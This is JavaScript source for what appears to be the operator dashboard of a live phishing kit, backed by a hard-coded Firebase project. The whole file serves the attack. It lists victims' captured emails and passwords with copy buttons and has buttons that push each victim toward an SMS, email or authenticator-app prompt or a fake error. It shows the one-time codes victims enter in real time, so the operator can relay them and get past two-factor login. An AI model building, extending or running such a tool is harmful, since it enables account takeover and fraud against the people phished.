import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
import { getDatabase, ref, onChildAdded, update, remove, push } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCgeJj-pm0yFbO_UcH06NBfaGm0H-YUVZA",
  authDomain: "live-47884.firebaseapp.com",
  databaseURL: "https://live-47884-default-rtdb.firebaseio.com",
  projectId: "live-47884",
  storageBucket: "live-47884.firebasestorage.app",
  messagingSenderId: "1020379584903",
  appId: "1:1020379584903:web:51805d3077b9802dd95b22",
  measurementId: "G-NKKST173G4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// ===== RESET BUTTON =====
const resetBtn = document.createElement("button");
resetBtn.textContent = "Reset All Data";
resetBtn.style.background = "red";
resetBtn.style.color = "#fff";
resetBtn.style.padding = "10px";
resetBtn.style.border = "none";
resetBtn.style.marginBottom = "15px";
resetBtn.style.cursor = "pointer";
document.body.insertBefore(resetBtn, document.body.firstChild);

resetBtn.onclick = () => {
  if (!confirm("Are you sure you want to delete ALL data?")) return;

  // CLEAR DATABASE
  remove(ref(db, 'messages'));
  remove(ref(db, 'logins'));
  remove(ref(db, 'verificationCodes'));

  // CLEAR UI
  document.getElementById("messages").innerHTML = "";
  loginContainer.innerHTML = "<h3>Logins</h3>";

  // ✅ Instead of alert, you could show a temporary status message
  showStatus("All data cleared!", "success");
};

// ===== STATUS MESSAGE HELPER =====
function showStatus(msg, type = "info") {
  let statusEl = document.getElementById("statusMessage");
  if (!statusEl) {
    statusEl = document.createElement("div");
    statusEl.id = "statusMessage";
    statusEl.style.position = "fixed";
    statusEl.style.top = "10px";
    statusEl.style.right = "10px";
    statusEl.style.padding = "10px 15px";
    statusEl.style.borderRadius = "5px";
    statusEl.style.zIndex = "9999";
    statusEl.style.color = "#fff";
    statusEl.style.fontFamily = "Arial, sans-serif";
    document.body.appendChild(statusEl);
  }

  statusEl.style.background = type === "success" ? "green" :
                             type === "error" ? "red" : "#333";
  statusEl.textContent = msg;
  statusEl.style.opacity = "1";

  // Fade out after 2.5 seconds
  setTimeout(() => { statusEl.style.opacity = "0"; }, 2500);
}

// ===== MESSAGES =====
const messageContainer = document.getElementById("messages");

onChildAdded(ref(db, 'messages'), (snapshot) => {
  const data = snapshot.val();
  const p = document.createElement("p");
  p.textContent = "Message: " + data.text;
  messageContainer.appendChild(p);
});

// ===== LOGINS =====
const loginContainer = document.getElementById("loginContainer");
loginContainer.innerHTML = "<h3>Logins</h3>";

onChildAdded(ref(db, 'logins'), (snapshot) => {
  const data = snapshot.val();
  const loginId = snapshot.key;

  // ✅ Email wrapper
  const emailWrapper = document.createElement("div");
  emailWrapper.style.display = "flex";
  emailWrapper.style.alignItems = "center";
  emailWrapper.style.marginBottom = "4px";

  const emailText = document.createElement("span");
  emailText.textContent = `Email: ${data.email}`;
  emailText.className = "login-text";

  const emailCopyBtn = document.createElement("button");
  emailCopyBtn.textContent = "Copy";
  emailCopyBtn.className = "copy-btn";
  emailCopyBtn.style.marginLeft = "6px";
  emailCopyBtn.onclick = () => {
    navigator.clipboard.writeText(data.email)
      .then(() => showStatus(`Copied: ${data.email}`, "success"))
      .catch(() => showStatus("Failed to copy", "error"));
  };

  emailWrapper.appendChild(emailText);
  emailWrapper.appendChild(emailCopyBtn);

  // ✅ Password wrapper
  const passWrapper = document.createElement("div");
  passWrapper.style.display = "flex";
  passWrapper.style.alignItems = "center";
  passWrapper.style.marginBottom = "8px";

  const passText = document.createElement("span");
  passText.textContent = `Password: ${data.password}`;
  passText.className = "login-text";

  const passCopyBtn = document.createElement("button");
  passCopyBtn.textContent = "Copy";
  passCopyBtn.className = "copy-btn";
  passCopyBtn.style.marginLeft = "6px";
  passCopyBtn.onclick = () => {
    navigator.clipboard.writeText(data.password)
      .then(() => showStatus(`Copied: ${data.password}`, "success"))
      .catch(() => showStatus("Failed to copy", "error"));
  };

  passWrapper.appendChild(passText);
  passWrapper.appendChild(passCopyBtn);

  // ===== Verification buttons =====
  const buttonsDiv = document.createElement("div");
  buttonsDiv.style.marginBottom = "10px";

  const smsBtn = document.createElement("button");
  smsBtn.textContent = "SMS Code";
  smsBtn.style.marginRight = "5px";

  const emailBtn = document.createElement("button");
  emailBtn.textContent = "Email Code";
  emailBtn.style.marginRight = "5px";

  const appBtn = document.createElement("button");
  appBtn.textContent = "Auth App";

  const notFoundBtn = document.createElement("button");
  notFoundBtn.textContent = "Account Not Found";
  notFoundBtn.style.marginLeft = "5px";

  const wrongPassBtn = document.createElement("button");
  wrongPassBtn.textContent = "Wrong Password";
  wrongPassBtn.style.marginLeft = "5px";

  // Button onclick with toggle
  smsBtn.onclick = () => { 
    update(ref(db, `logins/${loginId}`), { verificationType: "sms" }); 
    toggleClicked(smsBtn, [emailBtn, appBtn, wrongPassBtn, notFoundBtn]);
  };
  emailBtn.onclick = () => { 
    update(ref(db, `logins/${loginId}`), { verificationType: "email" });
    toggleClicked(emailBtn, [smsBtn, appBtn, wrongPassBtn, notFoundBtn]);
  };
  appBtn.onclick = () => { 
    update(ref(db, `logins/${loginId}`), { verificationType: "app" }); 
    toggleClicked(appBtn, [smsBtn, emailBtn, wrongPassBtn, notFoundBtn]);
  };
  notFoundBtn.onclick = () => { 
    update(ref(db, `logins/${loginId}`), { verificationType: "notfound" });
    toggleClicked(notFoundBtn, [smsBtn, emailBtn, appBtn, wrongPassBtn]);
  };
  wrongPassBtn.onclick = () => { 
    update(ref(db, `logins/${loginId}`), { verificationType: "wrongpass" }); 
    toggleClicked(wrongPassBtn, [smsBtn, emailBtn, appBtn, notFoundBtn]);
  };

  buttonsDiv.appendChild(notFoundBtn);
  buttonsDiv.appendChild(wrongPassBtn);
  buttonsDiv.appendChild(smsBtn);
  buttonsDiv.appendChild(emailBtn);
  buttonsDiv.appendChild(appBtn);

  // ===== Code display =====
  const codeP = document.createElement("p");
  codeP.id = `code-${loginId}`;
  codeP.textContent = "Code: Waiting...";

  onChildAdded(ref(db, 'verificationCodes'), (codeSnap) => {
    const codeData = codeSnap.val();
    if (codeData.loginId === loginId) {
      codeP.textContent = `Code: ${codeData.code} (${codeData.type})`;
    }
  });

  // ===== Card wrapper =====
  const card = document.createElement("div");
  card.className = "login-card";

  buttonsDiv.className = "buttons";
  smsBtn.className = "sms";
  emailBtn.className = "email";
  appBtn.className = "app";
  wrongPassBtn.className = "wrong-pass";
  notFoundBtn.className = "not-found";
  codeP.className = "code-box";

  card.appendChild(emailWrapper);
  card.appendChild(passWrapper);
  card.appendChild(buttonsDiv);
  card.appendChild(codeP);

  loginContainer.appendChild(card);
});

// ===== Helper: toggle clicked state =====
function toggleClicked(clickedBtn, otherBtns) {
  clickedBtn.classList.add("clicked");
  otherBtns.forEach(btn => btn.classList.remove("clicked"));
}